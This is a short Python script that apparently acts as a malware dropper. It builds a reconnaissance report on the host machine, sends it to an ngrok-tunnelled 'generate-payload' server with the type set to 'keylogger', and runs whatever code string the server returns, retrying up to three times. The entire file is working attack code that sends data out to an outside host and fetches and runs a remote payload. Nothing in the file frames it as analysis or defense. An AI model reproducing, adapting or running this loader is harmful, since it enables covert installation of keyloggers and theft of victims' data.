
import sys
import requests  
import recon, execute

API_URL = "https://22fd-14-99-167-142.ngrok-free.app/generate-payload"
PAYLOAD_TYPE = "keylogger"


def post_report(report_str: str) -> requests.Response:
    payload = {"malware_type": PAYLOAD_TYPE, "report": report_str}
    headers = {"Content-Type": "application/json"}
    resp = requests.post(API_URL, json=payload, headers=headers)
    return resp
def main() -> None:
    report_str = recon.build_continuous_report()

    max_attempts = 3
    attempt = 0

    while attempt < max_attempts:
        try:
            resp = post_report(report_str)

            try:
                data = resp.json()
            except ValueError:
                return

            if "payload" not in data:
                return

            payload = data["payload"]
            if not isinstance(payload, str):
                return

            status, result = execute.run_code(payload)

            if status:
                break  # Success, exit loop
            else:
                attempt += 1
                if attempt < max_attempts:
                    continue  # Try again
                else:
                    sys.exit(1)  # Failed after max attempts

        except requests.RequestException as e:
            print("[!] Network or request error:", e)
            break

        except Exception as e:
            print("[!] Unexpected error:", e)
            break


if __name__ == "__main__":
    main()

